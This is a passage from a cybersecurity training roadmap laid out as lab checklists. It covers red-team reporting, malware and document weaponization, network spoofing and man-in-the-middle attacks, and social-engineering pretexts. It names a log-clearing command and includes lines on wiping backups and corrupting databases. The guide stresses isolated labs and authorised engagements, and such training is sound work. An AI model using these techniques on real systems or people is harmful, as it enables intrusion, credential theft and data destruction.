- [ ] **Data Destruction:** Wipe **backups, system restore points** to prevent **recovery**.

- [ ] **Service Disruption:** Corrupt **databases, config files** to trigger **outages and chaos**.

---

<a id="stage-6-the-professional-governance-reporting"></a>

### **Stage 6: The Professional (Governance & Reporting)**

> [!TIP]
> **Goal:** Execute within legal/ethical boundaries and deliver findings professionally.

**Rules of Engagement & Compliance:**

- [ ] **Scope Adherence:** Operate only within **authorized IP ranges, domains, systems** per engagement letter.

- [ ] **ROE Documentation:** Track **timeline, actions, access paths, artifacts discovered** for audit trail.

- [ ] **Escalation & Abort:** Know **when to stop, how to notify blue team, emergency procedures**.

- [ ] **Data Handling:** Secure **screenshots, credentials, exfiltrated files** with **encryption, access control**.

**Framework Alignment & Documentation:**

- [ ] **MITRE ATT&CK Mapping:** Correlate **every technique used** (T1234.567) to **documented tactics**.

- [ ] **Kill Chain Analysis:** Track the **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions** flow.

- [ ] **Vulnerability Timeline:** Document **discovery date, exploitation date, remediation deadline**.

**Audience-Centric Reporting:**

- [ ] **Executive Summary:** Non-technical **risk/impact narrative** for **board/C-suite**.

- [ ] **Technical Deep-Dive:** Detailed **attack chain, proof-of-concept, IOCs** for **security/engineering teams**.

- [ ] **Remediation Roadmap:** Prioritized **fixes by risk level** with **effort estimates and timelines**.

- [ ] **Metrics & KPIs:** Highlight **MTTD (Mean Time to Detect), MTTC (Mean Time to Contain), detection gaps**.

<a id="lab-progression-part-7-system-hacking-initial-compromise"></a>

### **Lab Progression (Part 7: System Hacking & Initial Compromise)**

> [!TIP]
> **Goal:** Practice compromise only in controlled environments and produce professional evidence.

- [ ] **Beginner Host Labs:** Complete at least 5 intentionally vulnerable Linux/Windows machines; document initial access, privilege escalation, evidence, and remediation.
- [ ] **Credential Handling Lab:** Capture and crack lab-only hashes, then document storage, chain of custody, and cleanup. Use the Password Cracking Gate before attempting this.
- [ ] **Post-Exploitation Timeline:** Build an operator timeline and defender timeline for one lab compromise.
- [ ] **Detection Pairing:** For every exploit path, identify Windows Event Logs, Sysmon, auditd, network, or SIEM artifacts.
  > [!IMPORTANT]
  > **Move-On Gate — Part 7: System Hacking & Initial Compromise**
  >
  > You are not ready to move to Phase 2B until you can demonstrate ALL of the following without referencing a walkthrough:
  >
  > **Initial Access**
  >
  > - [ ] Exploit at least 3 different initial access vectors (SQLi, buffer overflow, phishing payload, or file upload bypass) on lab targets and produce a working shell
  > - [ ] Enumerate a target using only `nmap`, `gobuster`, and `linpeas`/`winpeas` without automated exploitation frameworks as a first pass
  >
  > **Windows Privilege Escalation**
  >
  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors (UAC bypass, service misconfiguration, token impersonation, or DLL hijacking)
  > - [ ] Run `winPEAS` and manually interpret every orange/red finding without relying on auto-exploitation
  >
  > **Linux Privilege Escalation**
  >
  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 8-vector methodology above (SUID, sudo misconfiguration, cron job, capabilities, writable file, NFS, kernel, or config leak)
  > - [ ] Complete at least 1 of: TryHackMe "Linux PrivEsc" room, HackTheBox Jarvis, or HackTheBox Cronos — with a written walkthrough
  >
  > **Persistence & Lateral Movement**
  >
  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts
  > - [ ] Successfully move laterally using Pass-the-Hash or Pass-the-Ticket in a lab Active Directory environment
  >
  > **Defense Evasion**
  >
  > - [ ] Identify what EDR/AV telemetry each technique generates and document a detection gap for at least 1 technique
  >
  > **Reporting**
  >
  > - [ ] Submit 3 full lab attack reports using the Part 39 structure (scope → recon → exploitation → post-exploitation → impact → remediation)
  > - [ ] Each report must have a defender timeline paired with the operator timeline

<a id="toc-part-8-malware--weaponization"></a>

---

## 🔹 Phase 2B: Advanced Offensive Operations

> _Parts 8–12 — Master weaponization, deception, disruption, and session manipulation. These build on the access gained in Phase 2A._

---

<a id="part-8-malware-weaponization"></a>

## Part 8: Malware & Weaponization

> **Safety Gate:** Malware work is restricted to isolated local labs with snapshots, host-only networking, no shared clipboard, no mounted host folders, and no third-party targets. Before running any sample or payload, define expected behavior, logging sources, rollback steps, and containment checks.

> [!NOTE]
> **Scope of This Part — Read Carefully:** This Part teaches malware as a **survey course**, not an implementation course. At this stage you have not yet studied how malware works at the binary/code level — that knowledge comes in **Part 28 (Reverse Engineering & Malware Analysis, Phase 7)**. Without that foundation, any malware you write will be a copy-paste artifact you cannot debug, fix, or adapt when it fails (and it will fail).
>
> **What IS covered here (practitioner-level):**
> - Malware taxonomy and attack lifecycle (categories, architecture decisions, C2 design thinking)
> - Tool-based weaponization: `msfvenom`, Metasploit payload generation, framework-managed C2 (Sliver, Mythic)
> - How AV/EDR detects malware conceptually (signature, heuristic, behavioral scanning)
> - Document and cloud delivery vectors — the initial access tradecraft that red teamers use operationally
>
> **What Stages 2–5 teach (exposure-level, not implementation-level):**
> Stages 2, 3, 4, and 5 describe techniques — shellcode injection, EDR bypass, anti-forensics — at the level of *what they are and how they work conceptually*. They are not implementation labs. Each of those stages carries an explicit `[!WARNING]` marker. When you see that marker: understand the concept, understand what defenders see, move on. Do **not** attempt custom code implementation until you have completed **Part 28 (RE & Malware Analysis)** and **Part 42 (Offensive Development, Phase 7)**.
>
> **Why this sequencing matters:** Students who attempt custom malware engineering before Part 28 produce tools they cannot debug, cannot evade EDR reliably, and cannot modify under time pressure. The correct sequence is: *understand the attack here (Part 8) → understand binaries and malware internals (Part 28) → build your own tooling (Part 42).*

<a id="stage-1-the-design-logic-architecture"></a>

### **Stage 1: The Design & Logic (Architecture)**

> [!TIP]
> **Goal:** Understand how malware is architected at a design level — the decisions an attacker makes before writing a single line of code.

- [ ] **Target the CIA Triad:** Define the malware's objective — does it attack **Confidentiality** (RAT, spyware, credential harvester), **Integrity** (wiper, data corruption), or **Availability** (ransomware, DDoS bot)? The objective drives every architectural decision.

- [ ] **Malware Taxonomy:** Understand the full taxonomy — **dropper, loader, stager, RAT, rootkit, worm, ransomware, wiper, infostealer, spyware, adware, botnet agent** — and how each category relates to the attack lifecycle phase it serves.

- [ ] **C2 Protocol Selection:** Understand the trade-offs between **HTTP/S beaconing, DNS tunneling, ICMP covert channels, and legitimate SaaS API abuse** — not to implement them at this stage, but to understand why attackers choose one over another based on network visibility risk. Implementation comes in Part 42.

- [ ] **Persistence Architecture:** Survey the persistence mechanisms available — **registry run keys, scheduled tasks, WMI subscriptions, DLL hijacking, boot sector** — understand their detection footprint differences conceptually. Implementation and lab practice comes in Part 7 (system hacking) and Part 42.

- [ ] **Kill Chain Mapping:** Use the **Cyber Kill Chain** or **MITRE ATT&CK** to map a hypothetical malware campaign from **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives**. This mapping exercise trains your mind to think like an attacker planning a campaign, not just using a tool.

- [ ] **Diamond Model:** Apply the **Diamond Model** to a real APT's malware — adversary, capability, infrastructure, victim — to understand why the same malware capability looks different depending on the targeted victim sector.

---

<a id="stage-2-the-payload-mechanism-weaponization"></a>

### **Stage 2: The Payload & Mechanism — Exposure Survey**

> [!WARNING]
> **Exposure-Only Stage:** This stage describes weaponization techniques at a conceptual level. Do not attempt to implement custom payloads, shellcode injection, or custom C2 until you have completed **Part 28 (Reverse Engineering & Malware Analysis, Phase 7)** and **Part 42 (Offensive Development, Phase 7)**. Your goal here is to understand *what* these techniques do and *why* defenders flag them — not to build them.

> [!TIP]
> **Goal:** Understand how payloads execute and what defenders detect at each stage.

- [ ] **Memory-Based Execution:** Understand that attackers inject code into running processes (shellcode injection, process hollowing, DLL injection) to avoid writing to disk and evade file-scanning AV. *Conceptual understanding only — implementation in Part 42.*

- [ ] **Delivery Vectors:** Understand **phishing, drive-by download, watering hole, and supply chain injection** as the four primary delivery mechanisms; know what each one requires from the attacker and what it looks like to defenders. *Practical delivery lab in Stage 6 (document weaponization) below.*

- [ ] **Staged Payload Architecture:** Understand the difference between **stageless** (one-shot complete payload) and **staged** (stager fetches the full payload at runtime) delivery — know why staged reduces initial payload size but requires an active C2 listener. Use `msfvenom` to generate both and compare their byte sizes and detection rates against VirusTotal (educational only — never upload customer/lab-specific payloads).

- [ ] **Framework-Managed C2:** Deploy **Sliver** or **Mythic** in your lab, generate an implant, and establish a callback — understand listener configuration, sleep/jitter tuning, and how traffic patterns affect detection. This is the operational-tool-based weaponization that is in scope at this stage.

---

<a id="stage-3-evasion-defense-bypassing-invisibility"></a>

### **Stage 3: Evasion & Defense Bypassing — Exposure Survey**

> [!WARNING]
> **Exposure-Only Stage:** This stage teaches *how* AMSI bypass, EDR hook removal, and memory-based evasion work at a conceptual level. Do not attempt to implement these at this stage. Custom evasion requires understanding the Windows internals that these techniques exploit — that knowledge is in **Part 28 (Reverse Engineering & Malware Analysis)**. Practical evasion implementation is in **Part 42 (Offensive Development, Phase 7)**.

> [!TIP]
> **Goal:** Understand how the defensive stack detects malware and what attackers do to evade each layer.

> **Prerequisite Context:** This stage references AMSI, EDR, and ETW. Those systems are covered from the defender's perspective in **Phase 3 (Part 13A: Stages 3–5)**. If you have not completed Phase 3 yet, read those stages before studying evasion — evasion without understanding the detection model is guesswork.

- [ ] **Static Analysis Evasion:** Understand that AV signature detection works by matching known byte patterns — attackers evade it by changing the binary (packing, encoding, obfuscation). Know *that* this works conceptually; implementing a custom packer requires PE format knowledge from Part 28.

- [ ] **Sandbox Detection:** Understand that sandboxes run samples in controlled VMs — attackers detect this by checking for VM artifacts (driver names, low CPU count, no mouse movement), then go dormant. Know the technique; study the implementation in Part 28.

- [ ] **EDR Userland Hooking Bypass:** Understand that EDR products hook Windows API functions at userland to intercept suspicious calls — attackers bypass this by calling syscalls directly or by unhooking. *Conceptual understanding only — syscall implementation in Part 42.*

- [ ] **Memory-Based Evasion Concepts:** Understand *what* sleep obfuscation, call stack spoofing, and indirect syscalls do — each is a technique that makes a beacon harder to detect during memory scanning. Implementation and lab practice in Part 42.

---

<a id="stage-4-persistence-escalation-entrenchment"></a>

### **Stage 4: Persistence & Escalation — Exposure Survey**

> [!WARNING]
> **Exposure-Only Stage:** Persistence mechanisms and privilege escalation are taught as canonical practitioner skills in **Part 7 (System Hacking, Phase 2)** already. This stage reviews them in the context of malware architecture — what a long-running implant uses to survive reboots and credential rotations. Rootkit-level persistence (BOOTKIT, UEFI implants, kernel drivers) requires kernel internals knowledge from Part 28. Do not attempt rootkit implementation at this stage.

> [!TIP]
> **Goal:** Understand what persistence mechanisms a malware implant uses and why each has a different detection footprint.

- [ ] **Userland Persistence Review:** Map the common mechanisms — **registry run keys, scheduled tasks, WMI subscriptions, DLL search order hijacking, Startup folder, COM object hijacking** — to their Windows Event Log artifacts (which Event IDs indicate each mechanism was set). This is the defender-aware review; you practiced them in Part 7.

- [ ] **Privileged Persistence Concepts:** Understand that kernel-level and UEFI-level persistence (bootkits, driver implants) exist and require privileged access plus deep OS internals knowledge — covered in Part 28. Recognizing their artifacts is the skill to acquire here.

- [ ] **Defense Disabling (Conceptual):** Understand that advanced malware terminates AV/EDR processes or disables tamper protection when running as SYSTEM — recognizing this behavior in logs is the defender-relevant skill; the implementation is in Part 42.

---

<a id="stage-5-counter-forensics-professionalism-the-cleanup"></a>

### **Stage 5: Counter-Forensics & Cleanup — Exposure Survey**

> [!WARNING]
> **Exposure-Only Stage:** Anti-forensics (log manipulation, timestamp modification, artifact scrubbing) are covered conceptually here. Implementing effective anti-forensics requires understanding *what* forensic artifacts exist — that knowledge is in **Part 27 (Digital Forensics, Phase 7)**. The skill to develop here is recognizing what evidence an attacker would try to destroy, so you can look for its *absence* during an investigation. Operationally, within a legitimate red team engagement, artifact cleanup must stay within Rules of Engagement and must never destroy evidence on production systems.

> [!TIP]
> **Goal:** Understand what artifacts malware and operators leave behind, and what attackers do to reduce their forensic footprint.

- [ ] **Windows Artifact Landscape:** Know the key artifacts that survive after an attack — **Windows Event Logs, Prefetch files, Shimcache, Amcache, LNK files, MFT records, browser history, $MFT journal, registry hives** — and understand which artifacts survives a reboot, a log clear, or a disk wipe.

- [ ] **Log Manipulation Awareness:** Understand that attackers clear Event Logs using `wevtutil cl System` and that this clearing *itself* generates Event ID 1102 (Security log cleared) — defenders look for the clearing event, not just empty logs. Also understand that SIEMs receive log forwarding — clearing local logs after a SIEM has already ingested them accomplishes nothing.

- [ ] **Anti-Forensics Counter-Detection:** Know the defender techniques that defeat anti-forensics: **Write-Protect + Memory Forensics (Volatility)**, **SIEM log forwarding**, **EDR telemetry that bypasses local log clearing**, **backup snapshot retention**, and **network forensic reconstruction from PCAP**.

- [ ] **ROE Compliance:** In a red team engagement, anti-forensics and log cleanup are controlled by Rules of Engagement — know exactly what your RoE permits before touching any log or artifact, and never destroy data on production systems regardless of privilege level.

---

<a id="stage-6-document-cloud-weaponization"></a>

### **Stage 6: Document & Cloud Weaponization**

> [!TIP]
> **Goal:** Weaponize documents, email clients, and cloud services for initial access, persistence, and exfiltration. This is the **operational implementation stage** for Part 8 — the techniques here are in-scope for lab practice because they use documented attack patterns that do not require binary internals knowledge.

> **Prerequisite:** Complete Part 7 (System Hacking), Part 9 (Sniffing & Spoofing), and Part 10 (Social Engineering) before this stage.

**Office & Document Exploits:**

- [ ] **VBA & XLM 4.0 Macros (Legacy — Declining):** Understand VBA macro payload construction and template injection (`remote DOTM`) — note that **Microsoft's February 2022 change blocks VBA macros from internet-sourced Office files by default** across Office 365 and 2019/2021. Macro-based delivery is now uncommon in phishing campaigns without specific user interaction (Enable Content prompt). Know the technique; prioritize modern alternatives below.

- [ ] **HTML Smuggling (Current Primary Vector):** Build HTML files that use the **`Blob` API and `createObjectURL`** to reconstruct a payload inside the browser, bypassing email gateway and web proxy file-type scanning. HTML smuggling now accounts for a significant proportion of red team initial access because attachments are not downloaded — they are assembled client-side. Practice building a minimal smuggler that delivers an EXE or ZIP without triggering gateway inspection.

- [ ] **OneNote/PDF/Embedded Files (Current Vector):** Weaponize **OneNote pages** (`.one` files with embedded scripts triggered by click), **PDF JavaScript** for opener execution, and **ISO/IMG container files** that bypass MOTW (Mark of the Web) on older Windows builds. Understand the **MOTW bypass path** (ISO → LNK → Script) and why Microsoft's October 2022 patches partially closed it.

- [ ] **DDE & Template Abuse:** Trigger code via **DDEAUTO**, external DOTM template injection, and **Follina-style** (`CVE-2022-30190`) URL template fetch — understand the patch status of each and what still fires in unpatched environments.

- [ ] **Browser-in-the-Browser (BitB) Attacks:** Build a **fake browser pop-up window** inside a legitimate page that mimics an SSO login dialog — bypasses awareness training because the URL displayed looks authentic. No code execution required; credentials are harvested directly.

**Email Client Abuse:**

- [ ] **Outlook Rules & Forms:** Create **client-side rules** for auto-forwarding/persistence and malicious **custom forms/add-ins**.

- [ ] **MAPI/Extended MAPI:** Leverage **Redemption/Outlook interop** for covert access and exfil.

**Cloud & SaaS Persistence:**

- [ ] **OAuth Consent Phishing:** Steal **refresh tokens** via malicious app registration; understand **scopes** and consent screens. _(See also Part 19: API Security and Part 23: Entra ID for deeper OAuth coverage.)_

- [ ] **Device Code & App Passwords:** Abuse **device code flow**, **legacy auth**, and **app passwords** for bypassing MFA.

- [ ] **Conditional Access Gaps:** Identify mis-scoped policies, **trusted locations**, and bypass paths.

- [ ] **Shared Mailboxes & Delegation:** Maintain access via **delegate rights** and mailbox rules.

**Data Exfiltration & Covert Channels:**

- [ ] **Cloud Storage APIs:** Use **Drive/OneDrive/Dropbox** APIs with **service accounts/tokens**; rotate tokens for persistence.

- [ ] **Covert Channels:** Exfil via **DNS-over-HTTPS**, **S3 pre-signed URLs**, **steganography in images/docs**, and throttled uploads.

- [ ] **Egress Controls:** Understand common **CASB/SWG** controls and how to mimic normal user traffic patterns.

**Logging, Forensics, and Cleanup:**

- [ ] **O365/Azure Audit:** Know where **Sign-In, Audit, Unified Audit** logs land; plan for artifacts.

- [ ] **Google Workspace Logs:** Review **Admin/Drive/Access Transparency** for trace evidence.

- [ ] **Artifact Hygiene:** Track **recent documents, registry keys, LNK files**, and clear only when within ROE.

### **Lab Progression (Part 8: Malware & Weaponization)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Generate 5 payload types with `msfvenom` (staged + stageless, EXE/DLL/PS1/ELF) and compare detection rates | VirusTotal screenshots + payload comparison report |
| 2 | Deploy Sliver or Mythic in your lab, generate an implant, establish callback, and configure sleep/jitter | C2 lab setup guide + beacon screenshot |
| 3 | Build an HTML smuggler that delivers a test payload (EICAR) through a simulated email gateway | HTML smuggler code + gateway bypass evidence |
| 4 | Weaponize a OneNote file with an embedded script that calls back to your Sliver listener | Weaponized `.one` file + callback screenshot |
| 5 | Map your lab campaign to MITRE ATT&CK — from delivery through C2 establishment | ATT&CK navigator layer JSON + technique annotations |

> [!IMPORTANT]
> **Move-On Gate (Part 8):** You can explain the malware taxonomy and choose the correct category for a given attack objective; generate payloads using `msfvenom` and a C2 framework; understand conceptually how Stages 2–5 techniques work and what defenders detect; deliver a weaponized document in a lab environment; and map a simulated campaign to MITRE ATT&CK. You are not expected to implement custom implants, PE packers, or EDR bypass code at this stage — that comes after Part 28 and in Part 42.

<a id="toc-part-9-sniffing--spoofing"></a>
<a id="part-9-sniffing-spoofing"></a>

## Part 9: Sniffing & Spoofing

<a id="stage-1-the-environment-fundamentals-the-setup"></a>

### **Stage 1: The Environment & Fundamentals (The Setup)**

> [!TIP]
> **Goal:** Understand the battlefield. You cannot spoof what you cannot map.

- [ ] **Protocol Hierarchy & Trust:** Differentiate between **MAC Addresses** (Layer 2 - Local Trust) and **IP Addresses** (Layer 3 - Routing). Spoofing relies on exploiting the trust mismatch between these layers.

- [ ] **Secure vs. Insecure Protocols:** Identify targets using cleartext protocols like **HTTP, FTP, Telnet, DNS**. These are trivial to sniff. Encrypted protocols like **TLS/HTTPS** and **SSH** require advanced downgrade attacks or decryption to bypass.

- [ ] **The Switch vs. Hub Reality:** Modern networks use switches which segment traffic by MAC. You cannot passively sniff; you must **ARP spoof, MAC flood**, or **VLAN hop** to bypass segmentation.

- [ ] **Interface Configuration:** Configure NIC to **Promiscuous Mode** (tcpdump, Wireshark) to capture all traffic, not just destined to your MAC; practice with **monitor mode** on wireless cards.

- [ ] **Handshake & Session Logic:** Study **TCP/TLS handshakes** (SYN/ACK, ClientHello/ServerHello) to identify session boundaries; understand **sequence numbers, window size, timestamps** for **replay and hijack** timing.

---

<a id="stage-2-sniffing-passive-reconnaissance-the-ear"></a>

### **Stage 2: Sniffing & Passive Reconnaissance (The Ear)**

> [!TIP]
> **Goal:** Capture data without alerting the target. "Listen before act."

- [ ] **Passive Packet Capture:** Use **tcpdump/Wireshark** to capture broadcast/multicast traffic (ARP, DHCP, mDNS) to identify active hosts, gateways, and services without sending directed traffic.

- [ ] **Wireless Interception:** Set wireless NIC to **monitor mode**; capture **WPA2/WPA3 4-way handshakes, PMKID** for offline cracking; identify **SSID, client MAC, AP MAC** patterns.

- [ ] **Protocol Analysis:** Filter **pcap** by protocol (HTTP, FTP, SMTP, DNS); identify **cleartext credentials, API keys, session tokens**, and software **User-Agent/Server banners**.

- [ ] **Stream Reassembly:** Use **tcpflow, Wireshark Follow TCP Stream** to reassemble files, images, emails, or form submissions from fragmented packets.

---

<a id="stage-3-spoofing-active-deception-the-lie"></a>

### **Stage 3: Spoofing & Active Deception (The Lie)**

> [!TIP]
> **Goal:** Inject false information into the network to redirect or manipulate traffic.

- [ ] **ARP Spoofing:** Flood the network with **gratuitous ARP packets** linking your MAC to the **gateway IP**; forces the switch to route victim traffic through you; use **arpspoof, dsniff, bettercap**.

- [ ] **DNS Spoofing:** Respond to **DNS queries faster than the legitimate server**; redirect victims to malicious login pages for **credential harvesting** or **malware distribution**.

- [ ] **DHCP Starvation & Rogue DHCP:** Exhaust legitimate DHCP pools and serve your own **gateway/DNS** to all clients; enables **MITM and traffic redirection**.

- [ ] **MAC Spoofing:** Change burned-in MAC to bypass **MAC filtering, NAC (Network Access Control), DHCP reservations**; use **macchanger** (Linux) or **SetMACAddress** (Windows).

- [ ] **IP Spoofing:** Forge **source IP** in packet headers to **hide identity, impersonate trusted hosts**, or launch **reflection/amplification attacks** in DDoS.

- [ ] **SSL Stripping & HTTP Downgrade:** Intercept **HTTPS traffic** and downgrade to **HTTP** by breaking the TLS handshake; use **sslstrip, mitmproxy** to expose encrypted traffic in cleartext.

---

<a id="stage-4-man-in-the-middle-exploitation-the-kill"></a>

### **Stage 4: Man-in-the-Middle & Exploitation (The Kill)**

> [!TIP]
> **Goal:** Intercept, modify, and relay traffic to extract or manipulate data.

- [ ] **MITM Positioning:** Establish yourself between victim and gateway via **ARP spoofing, DNS redirection, rogue DHCP, or rogue AP**; use **ettercap, mitmproxy, Burp Suite** to intercept and modify traffic in real-time.

- [ ] **Session Hijacking:** Extract **session cookies, JWT tokens, CSRF tokens** from sniffed **HTTP headers** and **POST bodies**; inject stolen tokens to impersonate user without password.

- [ ] **Credential Sniffing:** Capture **cleartext logins** (FTP, Telnet, HTTP Basic Auth, SMTP); extract **form credentials** from unencrypted POST requests.

- [ ] **Replay Attacks:** Capture valid **authentication tokens, API requests, or RF signals** and retransmit later to bypass time-based controls; works for **garage door openers, payment terminals, VoIP**.

- [ ] **Rogue Access Point / Evil Twin:** Deploy **fake Wi-Fi AP** with legitimate SSID + stronger signal; force users to connect and route all traffic through your box for **MITM harvesting**.

- [ ] **Traffic Injection & Modification:** Inject malicious **JavaScript, HTML, iframes** into unencrypted HTTP responses; modify **DNS responses** to redirect to attacker servers.

---

<a id="stage-5-defenses-mitigation-the-shield"></a>

### **Stage 5: Defenses & Mitigation (The Shield)**

- [ ] **Encryption & VPN:** Force all traffic through **TLS/HTTPS, IPSec VPN, or VPN tunneling**; renders sniffed payloads unreadable; watch for **HSTS, certificate pinning** as anti-bypass measures.

- [ ] **Switch-Level Protection:** **Dynamic ARP Inspection (DAI)**, **DHCP Snooping**, **port security** reject malformed ARP/DHCP; **802.1X authentication** prevents rogue device connection.

- [ ] **Network Segmentation:** **VLAN isolation, micro-segmentation, zero trust** limits sniffing scope per compromised segment; east-west traffic encryption adds extra layers.

- [ ] **Detection Systems:** **IDS/IPS** flag high ARP packet volume, **MITM tools (ettercap signatures)**, SSL downgrade attempts; **Netflow/sFlow** detects unusual traffic patterns.

- [ ] **User Awareness:** Train users to verify **SSL certificates**, recognize **phishing login pages**, and use **password managers** to avoid clipboard paste attacks.

<a id="lab-progression-part-9-sniffing-spoofing"></a>

### **Lab Progression (Part 9: Sniffing & Spoofing)**

| Level | Task                                                           | Deliverable                               |
| ----- | -------------------------------------------------------------- | ----------------------------------------- |
| 1     | Capture traffic with Wireshark in a home lab (HTTP, FTP, DNS)  | Annotated pcap with credential extraction |
| 2     | Perform ARP spoofing + MITM with Bettercap in lab              | Screenshot of intercepted traffic         |
| 3     | Execute DNS spoofing to redirect lab traffic to phishing page  | DNS spoof lab report                      |
| 4     | Perform SSL stripping against a lab web server without HSTS    | Before/after traffic comparison           |
| 5     | Full MITM chain: ARP spoof → DNS redirect → credential capture | End-to-end MITM lab report                |

> [!IMPORTANT]
> **Move-On Gate:** You can perform a complete MITM attack chain in a lab, capture credentials from unencrypted and downgraded traffic, and explain exactly which defenses (DAI, HSTS, certificate pinning) would have prevented each technique.

---

<a id="toc-part-10-social-engineering"></a>
<a id="part-16-adversary-emulation-purple-teaming"></a>

## Part 16: Adversary Emulation & Purple Teaming _(Phase 6 Capstone)_

> [!NOTE]
> **Navigational Note — Why Part 16 Is Here:** Part 16 is the **Phase 6 Capstone** — it synthesizes all content from Parts 23–26 (Active Directory, Cloud, Containers, OT) into a unified adversary emulation exercise. It is numbered 16 because it was originally placed sequentially after Phase 3's Part 15 (OSINT & Threat Intelligence) in the roadmap's initial design. It belongs contextually in Phase 6, not Phase 3. When you see cross-references to "Part 16" elsewhere in the roadmap, they refer to this section in Phase 6.

## Part 10: Social Engineering

> **Safety Gate:** Social engineering practice must use consented simulations only. Do not target real people, employers, classmates, public organizations, or family accounts. Unauthorized phishing and impersonation are not "practice"; they are operational and legal exposure.

<a id="stage-0-the-psychology-of-social-engineering"></a>

### **Stage 0: The Psychology of Social Engineering (The Foundation)**

> [!IMPORTANT]
> **Read this before any other Stage in Part 10.** Social engineering is not a collection of clever tricks — it is applied psychology. Every phishing email, vishing call, and pretexting scenario works because it exploits specific, documented cognitive patterns. Understanding these patterns is what separates an operator who succeeds from one who improvises and fails. Defenders must also understand them to design effective awareness training.

> [!TIP]
> **Goal:** Understand the psychological machinery that makes humans predictable under social engineering pressure.

**Cialdini's 6 Principles of Influence (The SE Attacker's Toolkit)**

Robert Cialdini's research on influence identified six universal principles that attackers weaponize. Know each one, recognize it in real-world phishing/pretexting scenarios, and understand both the offensive use and the defensive countermeasure:

- [ ] **1. Reciprocity:** People feel obligated to return favors. Attackers exploit this by sending small gifts, providing helpful information, or doing something "nice" before making a request. Example: Attacker sends a "free" IT tool or helps with a minor problem, then requests access credentials as a natural follow-up.
  - _Defensive awareness:_ Question why an unsolicited party is offering help. Favors from unknown parties are often hooks.

- [ ] **2. Commitment & Consistency:** Once a person commits to something (even trivially), they are psychologically compelled to behave consistently with that commitment. Attackers use small initial requests ("Could you confirm your department?") to build toward larger ones. Example: Foot-in-the-door technique — escalating from harmless questions to credential requests.
  - _Defensive awareness:_ Recognizing that you've agreed to small requests from someone does not obligate you to agree to larger, unusual ones.

- [ ] **3. Social Proof:** People look at what others are doing to determine correct behavior, especially in uncertain situations. Attackers fabricate social proof: "Everyone on your team has already verified their account" or "The CISO approved this procedure." Example: Mass-phishing emails claiming widespread adoption of a fake security update.
  - _Defensive awareness:_ Verify claims of "everyone is doing it" through independent channels — not through links or numbers provided by the requester.

- [ ] **4. Authority:** People comply with perceived authority figures — especially in professional environments. Attackers impersonate executives (CEO fraud/BEC), IT helpdesk, auditors, law enforcement, or regulators. Example: "This is John from IT Security. We detected suspicious activity on your account. I need your current password to verify."
  - _Defensive awareness:_ Real authority figures with legitimate needs never require your password. Verify identity through a known, independent channel before complying.

- [ ] **5. Liking:** People are more likely to comply with requests from people they like or who are similar to them. Attackers build rapport, mirror body language, reference shared interests, claim mutual connections, use flattery. Example: LinkedIn profile mining to find shared connections and mention them in a phishing email to build perceived familiarity.
  - _Defensive awareness:_ Likeability is not trust. A pleasant, familiar-seeming contact can be a well-prepared attacker.

- [ ] **6. Scarcity:** Perceived scarcity creates urgency that bypasses rational decision-making. "This offer expires in 10 minutes," "Your account will be suspended in 24 hours," "Only you can fix this." Urgency is the primary switch that disables critical thinking. Example: Phishing emails with countdown timers or imminent threat messaging.
  - _Defensive awareness:_ Real systems with legitimate urgency allow time for verification. Artificial urgency is a psychological weapon — slow down when you feel rushed.

---

**Cognitive Biases Exploited in Social Engineering**

- [ ] **Urgency Bias (System 1 Thinking):** Under time pressure, humans switch from deliberate analytical thinking (System 2) to fast, pattern-matching intuition (System 1). Attackers manufacture urgency to prevent System 2 thinking. Countermeasure: Organizations should establish policies that require verification delays for unusual requests regardless of stated urgency.

- [ ] **Authority Bias:** The tendency to trust and obey authority figures. Manifests as compliance with requests from anyone displaying authority markers (uniform, title, confident tone). Particularly effective via email where visual deception is easy.

- [ ] **Familiarity/Exposure Effect:** Mere repeated exposure to a name, brand, or scenario increases trust in it. Attackers send "drip" campaigns — multiple low-pressure contacts before the actual attack — to build familiarity before the high-pressure request.

- [ ] **In-Group Bias:** People are more cooperative with members of their perceived in-group. Attackers research corporate culture, use internal jargon, name-drop colleagues, and reference recent company events to establish perceived membership. LinkedIn, Glassdoor, job postings, and conference agendas are primary intelligence sources for this.

- [ ] **Fear of Negative Consequence:** The threat of something bad happening (job loss, account suspension, legal action, IT lockout) overrides rational verification behavior. Attackers combine authority + scarcity + threat in "warning emails" from fake IT/HR/legal.

---

**Pretext Construction Methodology**

- [ ] **Pretext Definition:** A pretext is a fabricated scenario, identity, and backstory that the attacker uses to justify the unusual request they are making. A strong pretext is internally consistent, draws on real intelligence about the target, and anticipates objections.

- [ ] **Pretext Construction Framework:** A professional pretext must answer five questions before deployment:
  1. **Who am I?** (role, organization, relationship to target)
  2. **Why am I contacting this person?** (plausible reason grounded in reality)
  3. **What am I asking for?** (specific, reasonable-sounding request)
  4. **Why now?** (urgency rationale that doesn't trigger suspicion)
  5. **What objections might arise, and what is my answer?** (anticipate resistance)

- [ ] **Pretext Intelligence Requirements:** A pretext draws from real OSINT:
  - Employee names, titles, reporting structure (LinkedIn, company website)
  - Recent company events, announcements, projects (press releases, social media)
  - Technology stack used (job postings reveal software in use)
  - Corporate language, acronyms, cultural references (Glassdoor, LinkedIn posts)
  - Physical location details (office address, badge vendor, building layout)

- [ ] **Persona Maintenance:** Once deployed, a pretext must be maintained consistently. Common operator failure: deviating from the stated identity under pressure or failing to answer follow-up questions consistently. A strong pretext is rehearsed, not improvised. Practice the pretext scenario out loud before deployment.

- [ ] **Pretext Failure Modes:** Know what causes pretexts to collapse:
  - Using insider jargon incorrectly (calls out external nature)
  - Unable to answer natural follow-up questions
  - Requesting information that the stated role wouldn't need
  - Inconsistency between email domain, phone number, and stated identity
  - Targets who independently verify through official channels (the defense)

---

<a id="stage-1-intelligence-reconnaissance-the-setup"></a>

### **Stage 1: Intelligence & Reconnaissance (The Setup)**

> [!TIP]
> **Goal:** Know the target better than they know themselves.

- [ ] **Digital Recon:** Execute **OSINT** using **Google Dorks, LinkedIn scraping, GitHub dorking** to extract employee names, emails, roles, tech stacks, and company structure.

- [ ] **Physical Recon:** Perform **dumpster diving** to recover **org charts, vendor invoices, sticky notes** with passwords; observe **badge access patterns, delivery procedures**.

